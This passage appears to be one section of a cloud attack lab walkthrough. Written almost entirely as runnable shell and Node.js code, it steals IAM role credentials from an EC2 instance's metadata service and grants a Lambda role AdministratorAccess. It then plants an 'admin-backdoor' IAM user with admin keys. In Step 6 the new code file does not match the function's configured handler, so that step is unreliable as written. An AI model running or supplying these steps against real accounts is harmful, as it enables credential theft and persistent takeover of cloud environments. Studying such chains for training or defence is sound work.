
# Attack 5: Privilege Escalation Using AWS IAM Permissions

Now we'll leverage the overly permissive IAM role that we discovered is attached to the Jenkins EC2 instance.

## Step 1: Check Available Permissions

From the reverse shell on the Jenkins server:

```bash
# View instance metadata
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Get the role name
ROLE_NAME=$(curl http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# Get the credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME
```

## Step 2: Configure AWS CLI with the Credentials

```bash
# Extract credentials from the metadata service
ACCESS_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME | grep AccessKeyId | cut -d'"' -f4)
SECRET_KEY=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME | grep SecretAccessKey | cut -d'"' -f4)
TOKEN=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME | grep Token | cut -d'"' -f4)

# Configure AWS CLI
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
export AWS_SESSION_TOKEN=$TOKEN
export AWS_DEFAULT_REGION=us-east-1  # Adjust region if necessary
```

## Step 3: Create a Malicious Lambda Function

```bash
# Create a temporary directory for our Lambda function
mkdir -p /tmp/lambda-function
cd /tmp/lambda-function

# Create a Lambda function that lists all IAM users
cat > index.js <<EOF
exports.handler = async (event) => {
  const AWS = require('aws-sdk');
  const iam = new AWS.IAM();
  
  // Get all IAM users
  const users = await iam.listUsers().promise();
  
  return {
    statusCode: 200,
    body: JSON.stringify(users),
  };
};
EOF

# Zip the Lambda function
zip function.zip index.js
```

## Step 4: Create an IAM Role for Lambda Execution

```bash
# Create a trust policy document
cat > trust-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "Service": "lambda.amazonaws.com"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF

# Create the role
aws iam create-role --role-name lambda-execution-role --assume-role-policy-document file://trust-policy.json

# Attach the administrator access policy to the role (this is what makes it dangerous)
aws iam attach-role-policy --role-name lambda-execution-role --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Step 5: Create and Invoke the Lambda Function

```bash
# Create the Lambda function
aws lambda create-function \
  --function-name privilege-escalation-demo \
  --runtime nodejs18.x \
  --role $(aws iam get-role --role-name lambda-execution-role --query 'Role.Arn' --output text) \
  --handler index.handler \
  --zip-file fileb://function.zip

# Invoke the Lambda function and capture the output
aws lambda invoke \
  --function-name privilege-escalation-demo \
  --payload '{}' \
  response.json

# View the output
cat response.json
```

## Step 6: Leverage the AdminstratorAccess to Create a Privileged IAM User

```bash
# Create a new policy document for creating IAM users
cat > lambda-create-user.js <<EOF
exports.handler = async (event) => {
  const AWS = require('aws-sdk');
  const iam = new AWS.IAM();
  
  // Create a new IAM user
  await iam.createUser({
    UserName: 'admin-backdoor'
  }).promise();
  
  // Create access keys for the user
  const accessKey = await iam.createAccessKey({
    UserName: 'admin-backdoor'
  }).promise();
  
  // Attach AdministratorAccess policy to the user
  await iam.attachUserPolicy({
    UserName: 'admin-backdoor',
    PolicyArn: 'arn:aws:iam::aws:policy/AdministratorAccess'
  }).promise();
  
  return {
    statusCode: 200,
    body: JSON.stringify(accessKey),
  };
};
EOF

# Zip the function
zip create-user.zip lambda-create-user.js

# Update the Lambda function
aws lambda update-function-code \
  --function-name privilege-escalation-demo \
  --zip-file fileb://create-user.zip

# Invoke the Lambda function
aws lambda invoke \
  --function-name privilege-escalation-demo \
  --payload '{}' \
  user-created.json

# View the credentials for the new admin user
cat user-created.json
```

## Step 7: Use the New Admin User Credentials

```bash
# Configure AWS CLI with the new credentials
export AWS_ACCESS_KEY_ID="[AccessKeyId from user-created.json]"
export AWS_SECRET_ACCESS_KEY="[SecretAccessKey from user-created.json]"
unset AWS_SESSION_TOKEN  # Remove the temporary token

# Verify full access as the new user
aws iam get-user
aws iam list-users
aws ec2 describe-instances
aws s3 ls
```
